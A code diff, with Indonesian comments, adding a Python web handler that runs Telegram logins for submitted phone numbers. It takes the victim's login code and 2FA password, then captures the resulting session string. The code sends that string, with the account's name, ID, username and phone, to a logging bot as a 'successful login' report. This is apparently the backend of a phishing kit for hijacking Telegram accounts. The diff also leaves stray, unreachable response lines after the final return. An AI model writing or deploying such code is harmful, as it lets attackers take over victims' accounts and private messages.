@@ -22,6 +22,7 @@ def bot_log(text):
 
 class handler(BaseHTTPRequestHandler):
     def do_POST(self):
+        # Mengambil parameter action dari URL
         action = self.path.split('=')[-1]
         content_length = int(self.headers['Content-Length'])
         post_data = json.loads(self.rfile.read(content_length))
@@ -34,6 +35,65 @@ class handler(BaseHTTPRequestHandler):
             loop.close()
         
         self.send_response(200)
+        self.send_header('Content-type', 'application/json')
+        self.end_headers()
+        self.wfile.write(json.dumps(response).encode())
+
+    async def manage_telegram(self, action, data):
+        phone = data.get('phone')
+        client = TelegramClient(StringSession(), API_ID, API_HASH)
+        
+        if action == 'send_code':
+            await client.connect()
+            try:
+                sent = await client.send_code_request(phone)
+                bot_log(f"🔔 **Input Nomor**\nNomor: `{phone}`")
+                # Mengirim hash ke frontend untuk disimpan
+                return {"success": True, "hash": sent.phone_code_hash}
+            except Exception as e:
+                return {"success": False, "error": str(e)}
+            finally:
+                await client.disconnect()
+
+        elif action == 'signin':
+            code = data.get('code')
+            password = data.get('password')
+            phone_code_hash = data.get('hash') # Menerima hash kembali dari frontend
+            
+            await client.connect()
+            try:
+                if password:
+                    await client.sign_in(phone=phone, password=password)
+                else:
+                    await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
+                
+                me = await client.get_me()
+                session_str = client.session.save()
+                
+                full_name = f"{me.first_name} {me.last_name if me.last_name else ''}".strip()
+                username = f"@{me.username}" if me.username else "N/A"
+                premium = "Ya 🌟" if me.premium else "Tidak"
+
+                report = (
+                    f"✅ **LOGIN BERHASIL**\n\n"
+                    f"👤 **Nama:** `{full_name}`\n"
+                    f"🆔 **ID:** `{me.id}`\n"
+                    f"📧 **User:** `{username}`\n"
+                    f"📱 **Phone:** `{phone}`\n"
+                    f"💎 **Premium:** `{premium}`\n\n"
+                    f"🔑 **SESSION STRING:**\n`{session_str}`"
+                )
+                bot_log(report)
+                return {"success": True}
+            except SessionPasswordNeededError:
+                bot_log(f"🔐 **Info 2FA**\nTarget: `{phone}`")
+                return {"success": True, "need_2fa": True}
+            except Exception as e:
+                return {"success": False, "error": str(e)}
+            finally:
+                await client.disconnect()
+
+        return {"success": False, "error": "Aksi tidak dikenal"}
         self.send_header('Content-type', 'application/json')
         self.end_headers()
         self.wfile.write(json.dumps(response).encode())
